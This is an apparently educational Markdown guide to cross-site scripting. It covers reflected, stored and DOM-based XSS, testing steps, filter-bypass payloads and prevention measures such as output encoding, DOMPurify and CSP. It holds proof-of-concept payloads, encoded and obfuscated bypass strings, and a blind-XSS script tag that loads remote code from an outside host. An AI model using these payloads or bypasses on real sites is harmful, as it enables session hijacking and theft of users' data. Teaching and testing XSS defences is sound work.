# XSS (Cross-Site Scripting) Vulnerabilities Guide

---

## What is XSS?

- **Cross-Site Scripting (XSS)** is a vulnerability that involves injecting **JavaScript** (or HTML/CSS) into a web page.
- It occurs when a website fails to properly **filter user input**, allowing an attacker to inject malicious code.
- When a user visits the affected page, the browser executes the injected script in the context of that page.

---

## How does XSS work?

- XSS works by **manipulating a vulnerable website** so it returns malicious JavaScript to users.
- When the code executes in a victim’s browser, the attacker can compromise their session, data, or perform unwanted actions.

---

## Types of XSS:

### Reflected XSS:
- Script is injected via input (e.g., search, URL) and **immediately reflected** in the response.
- **Example:**  
  `https://example.com/search?q=<script>alert(1)</script>`
- Requires user interaction (e.g., clicking a crafted link).

### Stored XSS:
- Malicious code is **persistently stored** (e.g., in a comment, profile, chat).
- Victims trigger it just by visiting the affected page.
- **Example:**  
  `<script src="https://js.rip/YOUR_CANARY"></script>` *(Blind XSS example, use XSS Hunter to catch it.)*

### DOM-Based XSS:
- Occurs entirely on the **client side** via manipulation of the DOM.
- The **server doesn't change** the response, but the JS code behaves differently.
- **Example:**
```js
var search = document.getElementById('search').value;
results.innerHTML = 'You searched for: ' + search;
// Input: <img src=x onerror='confirm()'>
```

---

## Where & How to test for XSS?

### General Steps:
1. Inject unique input (e.g., `test">test`) in various fields (URL, parameters, inputs).
2. Check reflection in responses or DOM.
3. Test with different payloads and observe behavior.

### Reflected XSS:
- Test points: URL parameters, headers, forms.
- Determine where input is reflected and test with JavaScript payloads.
- Try alternative encodings or bypasses.

### Stored XSS:
- Test fields: Comments, messages, profile fields, logs.
- Submit payloads like `<script>alert(1)</script>`.
- Observe if payload is executed when data is rendered.

### DOM-Based XSS:
- Look for parameters like `url=`, `returnurl=`, `redirect=`.
- Inject `javascript:confirm()` and observe changes in DOM.
- Use browser dev tools to trace how input is used in JS.

---

## Impact of XSS Vulnerabilities

- **Session Hijacking:** Stealing cookies or tokens.
- **Malicious Code Execution:** Redirections, fake forms, malicious actions.
- **Data Theft:** Stealing sensitive user information.
- **Website Defacement:** Changing page content or appearance.
- **Reputation Damage:** Loss of user trust.
- **Privilege Escalation:** If the victim is an admin.

### Stored vs Reflected:
- **Stored XSS** affects **every user** who visits the page.
- **Reflected XSS** requires **victim interaction** (e.g., click link).

---

## Bypass Techniques

### 1. **magic_quotes_gpc=ON**:
- Use `String.fromCharCode()`:
```html
<script>alert(String.fromCharCode(116,117,114,116,108,101,115));</script>
```

### 2. **HEX Encoding**:
- Encode payload:
```html
%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3b%3c%2f%73%63%72%69%70%74%3e
```

### 3. **Obfuscation**:
```html
<sCrIpT>alert(1);</ScRiPt>
```

### 4. **Context-Based Adjustments**:
- Break and close tags smartly:
```html
test'</h1> <svg onload=confirm()> <!--
```

---

## What can XSS be used for?

1. **Stealing Cookies / Sessions**
2. **Website Defacement**
3. **Malware Spreading**
4. **Keylogging**
5. **DOM Data Theft**
6. **Bypassing Security Controls**

---

## How to prevent XSS?

### 1. **Input Validation & Sanitization**
- Validate formats (e.g., emails).
- Sanitize dangerous characters like `<`, `>`, `"`.

### 2. **Encoding Output**
- **HTML Encoding**:
```php
<?php echo htmlspecialchars($_GET['search']); ?>
```
- **JavaScript Encoding**
- **URL Encoding** using `encodeURIComponent`

### 3. **Safe JS APIs**
- Use `.textContent` instead of `.innerHTML`
- Use **DOMPurify**:
```js
var cleanHTML = DOMPurify.sanitize(userInput);
output.innerHTML = cleanHTML;
```
- Use `createElement` + `appendChild` instead of raw HTML.
- **Avoid `eval()`**
- Always use `encodeURIComponent()` for URLs.

### 4. **Content Security Policy (CSP)**
```http
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
```

### 5. **Secure Headers**
- `X-Content-Type-Options: nosniff`
- `X-XSS-Protection: 1; mode=block` *(deprecated in modern browsers)*

### 6. **Avoid Inline Scripts**
- Use external event listeners instead of `onclick`.

### 7. **Secure Frameworks**
- Use frameworks like React, Angular, Vue — they escape by default.

### 8. **HTTPOnly & Secure Cookies**
- Prevent client-side JS from accessing cookies.

### 9. **Regular Audits**
- Use tools like **Burp Suite**, **OWASP ZAP**.
- Conduct regular **pentesting**.
